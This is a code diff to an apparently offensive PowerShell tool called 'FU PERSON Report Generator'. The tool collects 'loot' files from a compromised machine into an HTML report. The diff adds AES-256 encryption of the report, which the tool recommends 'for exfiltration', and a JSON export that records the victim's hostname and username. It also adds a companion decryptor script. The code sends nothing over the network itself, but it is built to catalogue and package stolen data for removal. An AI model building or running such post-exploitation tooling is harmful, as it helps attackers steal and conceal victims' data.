@@ -1,4 +1,4 @@
-<# ═══════════════════════════════════════════════════════════════════════
+﻿<# ═══════════════════════════════════════════════════════════════════════
    FLLC | FU PERSON | REPORT GENERATOR v2.0
    ╔══════════════════════════════════════════════════════════════════╗
    ║  Aggregate all loot into a single encrypted HTML report          ║
@@ -135,7 +135,7 @@ body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospac
  ╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
 </pre>
 <h1>LOOT REPORT</h1>
-<div class="subtitle">Generated: $timestamp | FLLC Operations Platform v2.0</div>
+<div class="subtitle">Find You Person | Generated: $timestamp | FLLC Operations Platform v2.0</div>
 </div>
 
 <div class="meta">
@@ -200,7 +200,7 @@ $($section.Icon) $($section.Label) <span class="count">$count files</span>
                 if ($item.Content) {
                     $escaped = [System.Web.HttpUtility]::HtmlEncode($item.Content)
                     if ($escaped.Length -gt 5000) {
-                        $escaped = $escaped.Substring(0, 5000) + "`n... [TRUNCATED — $($escaped.Length) chars total]"
+                        $escaped = $escaped.Substring(0, 5000) + "`n... [TRUNCATED - $($escaped.Length) chars total]"
                     }
                     $htmlBody += "<div class='file-content'>$escaped</div>"
                 }
@@ -227,10 +227,117 @@ document.querySelectorAll('.section-header')[0].nextElementSibling.classList.add
     $fullHTML | Out-File -FilePath $OutputPath -Encoding UTF8
 }
 
+function Protect-Report {
+    param(
+        [string]$InputPath,
+        [string]$Password
+    )
+
+    # AES-256 encryption of the HTML report
+    Write-Host "    [*] Encrypting report with AES-256..." -ForegroundColor DarkGray
+
+    try {
+        $content = [IO.File]::ReadAllBytes($InputPath)
+
+        # Derive key from password using PBKDF2 (RFC 2898)
+        $salt = New-Object byte[] 16
+        $rng = [Security.Cryptography.RNGCryptoServiceProvider]::new()
+        $rng.GetBytes($salt)
+
+        $deriveBytes = New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 100000)
+        $key = $deriveBytes.GetBytes(32)  # 256-bit
+        $iv  = $deriveBytes.GetBytes(16)  # 128-bit IV
+
+        $aes = [Security.Cryptography.Aes]::Create()
+        $aes.Key = $key
+        $aes.IV = $iv
+        $aes.Mode = [Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
+
+        $encryptor = $aes.CreateEncryptor()
+        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
+
+        # Write encrypted file: [salt(16)][encrypted_data]
+        $outputPath = $InputPath -replace '\.html$', '.enc'
+        $outputStream = [IO.File]::Create($outputPath)
+        $outputStream.Write($salt, 0, $salt.Length)
+        $outputStream.Write($encrypted, 0, $encrypted.Length)
+        $outputStream.Close()
+
+        # Create decryptor script alongside
+        $decryptScript = $InputPath -replace '\.html$', '_decrypt.ps1'
+        $decryptContent = @'
+# FU PERSON Report Decryptor
+# Usage: .\decrypt.ps1 -File "report.enc" -Password "your_password"
+param([string]$File, [string]$Password)
+$data = [IO.File]::ReadAllBytes($File)
+$salt = $data[0..15]
+$encrypted = $data[16..($data.Length-1)]
+$derive = New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 100000)
+$key = $derive.GetBytes(32); $iv = $derive.GetBytes(16)
+$aes = [Security.Cryptography.Aes]::Create()
+$aes.Key = $key; $aes.IV = $iv
+$aes.Mode = [Security.Cryptography.CipherMode]::CBC
+$aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
+$decryptor = $aes.CreateDecryptor()
+$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
+$outFile = $File -replace '\.enc$', '_decrypted.html'
+[IO.File]::WriteAllBytes($outFile, $decrypted)
+Write-Host "[+] Decrypted to: $outFile"
+'@
+        $decryptContent | Out-File $decryptScript -Encoding UTF8
+
+        # Remove unencrypted report
+        Remove-Item $InputPath -Force
+
+        $encSize = [math]::Round((Get-Item $outputPath).Length / 1024, 1)
+        Write-Host "    [+] Report encrypted: $outputPath (${encSize} KB)" -ForegroundColor Green
+        Write-Host "    [+] Decryptor script: $decryptScript" -ForegroundColor Green
+
+        $aes.Dispose()
+        $rng.Dispose()
+
+        return $outputPath
+    } catch {
+        Write-Host "    [!] Encryption failed: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "    [*] Unencrypted report preserved at: $InputPath" -ForegroundColor Yellow
+        return $InputPath
+    }
+}
+
+function Export-JSONReport {
+    param(
+        [hashtable]$Inventory,
+        [string]$OutputPath
+    )
+
+    $jsonData = @{
+        metadata = @{
+            generator = "FU PERSON Report Generator v2.0"
+            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            hostname = $env:COMPUTERNAME
+            username = $env:USERNAME
+        }
+        sections = @{}
+    }
+
+    foreach ($key in $Inventory.Keys) {
+        $jsonData.sections[$key] = @{
+            count = $Inventory[$key].Count
+            files = $Inventory[$key] | ForEach-Object {
+                @{ name = $_.Name; path = $_.Path; size = $_.Size; modified = $_.Modified }
+            }
+        }
+    }
+
+    $jsonData | ConvertTo-Json -Depth 5 | Out-File $OutputPath -Encoding UTF8
+}
+
 function Start-ReportGeneration {
     Write-Host ""
     Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
-    Write-Host "    ║  REPORT GENERATOR — Loot Aggregation Engine              ║" -ForegroundColor Magenta
+    Write-Host "    ║  REPORT GENERATOR - Loot Aggregation Engine v2.0         ║" -ForegroundColor Magenta
+    Write-Host "    ║  HTML | JSON | AES-256 Encryption | Multi-Device         ║" -ForegroundColor Magenta
     Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
 
     $lootDir = Find-LootDirectory
@@ -241,13 +348,16 @@ function Start-ReportGeneration {
 
     Write-Host "    [+] Loot directory: $lootDir" -ForegroundColor Green
     Write-Host "    [*] Scanning and categorizing files..." -ForegroundColor DarkGray
+    $startTime = Get-Date
 
     $inventory = Get-LootInventory -LootDir $lootDir
 
     $totalFiles = 0
+    $totalSize = 0
     foreach ($key in $inventory.Keys) {
         $count = $inventory[$key].Count
         $totalFiles += $count
+        foreach ($item in $inventory[$key]) { $totalSize += $item.Size }
         if ($count -gt 0) {
             Write-Host "    [+] $key`: $count files" -ForegroundColor Green
         }
@@ -258,21 +368,48 @@ function Start-ReportGeneration {
         return
     }
 
+    $totalSizeMB = [math]::Round($totalSize / 1MB, 2)
+    Write-Host "    [*] Found $totalFiles files (${totalSizeMB} MB) across 11 categories" -ForegroundColor DarkGray
+
+    # Generate HTML report
     $reportName = "FU_PERSON_REPORT_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
     $reportPath = Join-Path $lootDir $reportName
 
     Write-Host "    [*] Building HTML report..." -ForegroundColor DarkGray
     Build-HTMLReport -Inventory $inventory -LootDir $lootDir -OutputPath $reportPath
 
+    # Generate JSON companion report
+    $jsonPath = $reportPath -replace '\.html$', '.json'
+    Write-Host "    [*] Building JSON report..." -ForegroundColor DarkGray
+    Export-JSONReport -Inventory $inventory -OutputPath $jsonPath
+
+    # Offer encryption
     $reportSize = [math]::Round((Get-Item $reportPath).Length / 1024, 1)
+    Write-Host ""
+    Write-Host "    [?] Encrypt report with AES-256? (recommended for exfiltration)" -ForegroundColor Yellow
+    $encrypt = Read-Host "    root@fuperson:~# Encrypt? (y/N)"
+
+    $finalPath = $reportPath
+    if ($encrypt -eq 'y') {
+        $password = Read-Host "    root@fuperson:~# Enter encryption password"
+        if ($password.Length -ge 4) {
+            $finalPath = Protect-Report -InputPath $reportPath -Password $password
+            # Also encrypt JSON
+            Protect-Report -InputPath $jsonPath -Password $password | Out-Null
+        } else {
+            Write-Host "    [!] Password too short - skipping encryption" -ForegroundColor Yellow
+        }
+    }
+
+    $elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
 
     Write-Host ""
     Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
     Write-Host "    ║  REPORT GENERATED SUCCESSFULLY                            ║" -ForegroundColor Green
     Write-Host "    ╠══════════════════════════════════════════════════════════╣" -ForegroundColor Green
-    Write-Host "    ║  File: $reportName" -ForegroundColor Green
-    Write-Host "    ║  Size: ${reportSize} KB" -ForegroundColor Green
-    Write-Host "    ║  Path: $reportPath" -ForegroundColor Green
-    Write-Host "    ║  Files: $totalFiles categorized across 11 sections" -ForegroundColor Green
+    Write-Host "    ║  Report: $(Split-Path $finalPath -Leaf)" -ForegroundColor Green
+    Write-Host "    ║  Size: ${reportSize} KB | Files: $totalFiles" -ForegroundColor Green
+    Write-Host "    ║  Loot: ${totalSizeMB} MB across 11 categories" -ForegroundColor Green
+    Write-Host "    ║  Time: ${elapsed}s | Path: $lootDir" -ForegroundColor Green
     Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
 }
